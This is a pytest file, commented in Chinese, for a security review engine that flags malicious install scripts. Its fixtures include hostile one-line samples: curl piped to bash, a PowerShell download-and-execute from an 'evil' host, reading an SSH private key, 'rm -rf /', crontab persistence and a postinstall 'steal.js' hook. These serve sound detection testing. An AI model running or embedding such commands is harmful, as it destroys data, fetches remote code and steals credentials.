"""安全审查引擎测试（阶段 3）。

重点：
- 恶意安装脚本必须被检出，且发现项带文件/行号/原因；
- 报告**不得**出现「绝对安全」「无恶意代码」等无依据结论；
- critical 发现必须触发一票否决。
"""

from __future__ import annotations

import pytest

from app.analysis.security_review import ScannedFile, review_files
from app.models import FindingCategory, RiskLevel, SecurityReport


def test_clean_script_produces_no_findings_but_still_disclaims():
    report = review_files(
        [ScannedFile(path="hello.py", content="print('hi')\n")],
        coverage="partial",
    )
    assert report.findings == []
    assert report.risk_level is RiskLevel.NONE
    assert report.vetoed is False
    # 关键：即使没发现问题，报告也必须携带免责声明，且不得声称"未命中即安全"。
    assert report.notes, "报告 notes 不得为空"
    assert SecurityReport.DISCLAIMER in report.notes
    assert any("未命中" in n for n in report.notes)


def test_empty_input_also_carries_disclaimer():
    report = review_files([])
    assert SecurityReport.DISCLAIMER in report.notes


def test_curl_pipe_bash_is_critical_and_vetoes():
    report = review_files(
        [ScannedFile(path="install.sh", content="curl -fsSL https://x.y/z.sh | bash\n")],
        coverage="partial",
    )
    assert report.vetoed is True
    assert report.risk_level is RiskLevel.CRITICAL
    rule_ids = {f.rule_id for f in report.findings}
    assert "DL001" in rule_ids
    finding = next(f for f in report.findings if f.rule_id == "DL001")
    assert finding.file == "install.sh"
    assert finding.line == 1
    assert finding.category is FindingCategory.DYNAMIC_DOWNLOAD_EXECUTE
    assert finding.reason  # 必须给出原因


def test_powershell_download_execute_detected():
    report = review_files(
        [
            ScannedFile(
                path="setup.ps1",
                content="IEX(New-Object Net.WebClient).DownloadString('http://evil/x.ps1')\n",
            )
        ]
    )
    assert report.vetoed is True
    assert any(f.rule_id == "DL002" for f in report.findings)


def test_ssh_private_key_access_is_critical():
    report = review_files(
        [ScannedFile(path="collect.py", content="open('~/.ssh/id_rsa').read()\n")]
    )
    assert report.vetoed is True
    assert any(f.category is FindingCategory.CREDENTIAL_ACCESS for f in report.findings)


def test_rm_rf_root_detected_as_high():
    report = review_files([ScannedFile(path="clean.sh", content="rm -rf /\n")])
    assert report.risk_level is RiskLevel.HIGH
    assert report.vetoed is False  # high 不等于 critical
    assert any(f.category is FindingCategory.FILESYSTEM_DELETE for f in report.findings)


def test_shell_true_subprocess_detected():
    report = review_files(
        [
            ScannedFile(
                path="run.py",
                content="subprocess.run(cmd, shell=True)\n",
            )
        ]
    )
    assert any(f.rule_id == "SH001" for f in report.findings)


def test_persistence_crontab_detected():
    report = review_files(
        [ScannedFile(path="hook.sh", content='crontab -l | echo "* * * * * evil"\n')]
    )
    assert any(f.category is FindingCategory.PERSISTENCE for f in report.findings)


def test_postinstall_hook_detected():
    report = review_files(
        [ScannedFile(path="package.json", content='"postinstall": "node steal.js",\n')]
    )
    assert any(f.category is FindingCategory.POST_INSTALL_AUTORUN for f in report.findings)


def test_dependency_url_install_detected():
    report = review_files(
        [ScannedFile(path="req.txt", content="pip install git+https://x/y.git\n")]
    )
    assert any(f.rule_id == "DL003" for f in report.findings)


def test_empty_input_yields_unchecked_not_safe():
    report = review_files([], coverage="partial")
    assert report.findings == []
    assert report.coverage == "none"
    assert any("未检查" in n for n in report.notes)


def test_report_never_claims_absolute_safety():
    report = review_files([ScannedFile(path="a.py", content="x = 1\n")])
    blob = report.model_dump_json()
    for banned in ("绝对安全", "无恶意代码", "100% 安全", "绝对可靠"):
        assert banned not in blob


def test_line_numbers_are_accurate():
    content = "ok\nok\ncurl http://x | sh\nok\n"
    report = review_files([ScannedFile(path="s.sh", content=content)])
    finding = next(f for f in report.findings if f.rule_id == "DL001")
    assert finding.line == 3


def test_snippet_is_sanitized_single_line():
    content = "curl http://x | sh \x07\x08  \t extra\n"
    report = review_files([ScannedFile(path="s.sh", content=content)])
    finding = next(f for f in report.findings if f.rule_id == "DL001")
    assert "\x07" not in (finding.snippet or "")
    assert "\n" not in (finding.snippet or "")


def test_risk_level_takes_maximum_severity():
    content = "requests.post('http://x')\nrm -rf /\n"
    report = review_files([ScannedFile(path="mix.py", content=content)])
    assert report.risk_level is RiskLevel.HIGH


@pytest.mark.parametrize("path", ["install.sh", "setup.py", "package.json"])
def test_scanned_files_recorded(path: str):
    report = review_files([ScannedFile(path=path, content="# nothing\n")])
    assert path in report.scanned_files